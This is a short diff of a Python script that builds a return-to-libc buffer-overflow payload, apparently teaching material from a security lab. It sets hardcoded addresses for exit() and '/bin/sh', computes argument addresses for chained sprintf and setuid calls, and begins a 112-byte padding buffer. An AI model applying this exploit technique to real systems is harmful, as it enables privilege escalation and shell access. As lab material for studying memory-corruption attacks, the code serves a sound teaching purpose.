@@ -15,9 +15,9 @@ exit_addr    = 0xb7e369d0   # Address of exit()
 ebp_foo      = 0xbfffe4c8   # foo()'s frame pointer
 
 # Calculate the address of setuid()'s 1st argument
-sprintf_arg1 = ebp_foo + 12 + 5*0x20           (*@\ding{192}@*)
+sprintf_arg1 = ebp_foo + 12 + 5*0x20           
 # The address of a byte that contains 0x00
-sprintf_arg2 = sh_addr + len("/bin/sh")        (*@\ding{193}@*)
+sprintf_arg2 = sh_addr + len("/bin/sh")        
 
 content = bytearray(0xaa for i in range(112))
 
